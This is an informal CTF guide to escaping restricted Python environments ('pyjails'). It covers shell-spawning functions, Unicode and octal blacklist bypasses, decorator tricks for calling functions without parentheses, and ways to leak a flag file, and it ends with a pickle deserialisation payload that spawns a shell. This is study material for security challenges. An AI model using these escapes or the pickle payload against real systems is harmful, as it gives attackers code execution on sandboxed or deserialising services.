# The Definitive Guide to Pyjails

## Introduction

A PyJail, or Python Jail, refers to a restricted Python environment designed to limit the capabilities of code executed within it. It is commonly encountered in Capture The Flag (CTF) challenges and security exercises, where the goal is to "escape" the jail and achieve a higher level of access or control, often by accessing restricted functions.

---
## Traditional Pyjails

### Unicode bypass 😈😈😈
Probably the most straightforward way of escaping a pyjail if a SKID wrote it.  

Python normalises italics for some reason, but the characters don't match your normal ASCII table, so standard blacklists won't work.  

Note that symbols still remain the same.  

https://lingojam.com/ItalicTextGenerator

### Helpful builtins

`eval()`, `exec()`, `compile()`: execute arbitrary code

### Spawning shells / running system commands

Shell commands: `sh`, `python3`

Helpful functions:
- `os.system()`: probably the most well-known method     
- `subprocess.call()`, `subprocess.run()`: allows you to spawn shells
- `subprocess.Popen()`, `subprocess.check_output()`: runs commands and returns the output
- `pty.spawn()`: lesser known but still helpful!

Debug mode: `breakpoint()`, `__import__('sys').breakpointhook()`, `pdb.set_trace()`
- starts a python debugger

Python Interactive mode
- `code.interact()`: launches a Python shell
- `os.environ["PYTHONINSPECT"] = "1"`: launches a Python shell when your script finishes execution

### Reading files
`open('flag.txt').read()` (H2 computing doesn't recommend this)

But what if `print()` isn't available...?
- `help()`, `quit()`, `exit()`: essentially a one-time `print()`

But what if `read()` isn't accessible? Redirect to `stderr`!
1. unpack your file object into a string: `*open('flag.txt')`
2. then run a faulty conversion!: `int()`, `float()`, `complex()`

### No builtins???

### NO PARENTHESES??? 💔💔💔
Probably the most troublesome to bypass...  
Luckily, you can chain decorators to a dummy class to invoke functions without parentheses!

```python
@exec
@input
class C:
    ...
```

### NUKED BUILTINS 😱😱😱
Setting a `__builtins__` function to `None` completely removes the global reference to it (eg. `__builtins__.eval = None`)  

Honestly nothing you can do about it brotato chip ✌🥀, just find another entry point.  

### More stuff
Dynamically accessing attributes
- `getattr()`: for objects
- `__getitem__()`: for dictionaries

Octal encoding
- bypass blacklists within your strings!
- eg: `'\146\154\141\147.txt'` -> `'flag.txt'`

Assigning variables
- the walrus operator treats an assignment as an expression
- only works for variables (no attribute assignment)
- eg: `a:=1`

---
## SSTI

---
## Pickle
Pickle has a pretty well-known RCE exploit that allows you to run arbitrary commands on deserialisation.  

```python
class Exploit():
    def __reduce__(self):
        return (os.system, ('sh',))

payload = pickle.dumps(Exploit())
```